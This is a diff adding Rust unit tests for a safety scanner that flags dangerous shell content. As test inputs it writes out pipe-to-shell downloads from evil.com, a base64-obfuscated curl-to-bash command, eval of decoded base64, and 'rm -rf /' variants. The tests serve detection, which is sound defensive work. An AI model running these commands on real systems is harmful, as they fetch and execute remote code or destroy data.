@@ -336,3 +336,105 @@ fn find_snippet(content: &str, keyword: &str) -> Option<String> {
     let end = (pos + keyword.len() + 40).min(content.len());
     Some(content[start..end].trim().to_string())
 }
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn safety_scanner_detects_pipe_to_shell() {
+        let scan = SafetyScan::scan("curl https://evil.com/script.sh | bash");
+        assert!(scan.has_blocks());
+        assert!(
+            scan.findings
+                .iter()
+                .any(|f| f.rule_id == "shell-pipe-to-shell")
+        );
+    }
+
+    #[test]
+    fn safety_scanner_allows_clean_content() {
+        let scan = SafetyScan::scan("#!/usr/bin/env bash\nset -euo pipefail\necho hello");
+        assert!(!scan.has_blocks());
+        assert!(!scan.has_warnings());
+    }
+
+    #[test]
+    fn safety_scanner_detects_destructive_rm() {
+        let scan = SafetyScan::scan("rm -rf /tmp/cleanup");
+        assert!(!scan.has_blocks());
+    }
+
+    #[test]
+    fn safety_scanner_detects_destructive_rm_in_yaml_array() {
+        let scan = SafetyScan::scan("cmd: [\"rm\", \"-rf\", \"/\"]");
+        assert!(scan.has_blocks());
+    }
+
+    #[test]
+    fn safety_scanner_allows_safe_rm_in_yaml_array() {
+        let scan = SafetyScan::scan("cmd: [\"rm\", \"-rf\", \"/tmp/cleanup\"]");
+        assert!(!scan.has_blocks());
+    }
+
+    #[test]
+    fn safety_scanner_detects_destructive_rm_wildcard_in_yaml_array() {
+        let scan = SafetyScan::scan("cmd: [\"rm\", \"-rf\", \"/*\"]");
+        assert!(scan.has_blocks());
+    }
+
+    // --- T4: Obfuscation bypass detection ---
+
+    #[test]
+    fn detects_base64_to_shell() {
+        let scan = SafetyScan::scan("echo 'Y3VybCBldmlsLmNvbS9zaGVsbA==' | base64 -d | bash");
+        assert!(scan.has_blocks());
+        assert!(
+            scan.findings
+                .iter()
+                .any(|f| f.rule_id == "base64-obfuscation")
+        );
+    }
+
+    #[test]
+    fn detects_base64_decode_eval() {
+        let scan = SafetyScan::scan("eval $(echo 'payload' | base64 --decode)");
+        assert!(scan.has_blocks());
+    }
+
+    #[test]
+    fn high_entropy_detected() {
+        // 100 chars of base64-like content
+        let payload = "A".repeat(100);
+        let content = format!("data: {payload}");
+        let scan = SafetyScan::scan(&content);
+        assert!(
+            scan.findings
+                .iter()
+                .any(|f| f.rule_id == "high-entropy-string")
+        );
+    }
+
+    #[test]
+    fn normal_script_no_high_entropy() {
+        let scan = SafetyScan::scan("#!/bin/bash\nset -euo pipefail\necho 'hello world'\nexit 0");
+        assert!(
+            !scan
+                .findings
+                .iter()
+                .any(|f| f.rule_id == "high-entropy-string")
+        );
+    }
+
+    #[test]
+    fn variable_command_construction_detected() {
+        let scan = SafetyScan::scan("CMD=\"curl\"; $CMD http://evil.com/payload | bash");
+        // This should be caught by BOTH pipe-to-shell AND variable-command
+        assert!(scan.has_blocks()); // pipe-to-shell blocks
+        assert!(
+            scan.findings
+                .iter()
+                .any(|f| f.rule_id == "variable-command-construction")
+        );
+    }
+}
